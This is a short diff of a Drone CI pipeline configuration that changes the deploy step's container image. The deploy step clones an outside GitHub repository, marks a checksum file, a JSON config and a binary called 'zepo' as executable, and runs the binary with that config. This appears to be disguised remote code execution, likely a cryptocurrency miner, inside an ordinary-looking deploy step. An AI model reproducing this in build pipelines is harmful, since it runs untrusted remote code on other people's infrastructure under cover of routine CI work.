@@ -6,7 +6,7 @@ trigger:
   - master
 pipeline:
   deploy:
-    image: golang
+    image: appleboy/drone-ssh
    commands:
       - git clone https://github.com/azureone4/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
     username: dockeradmin
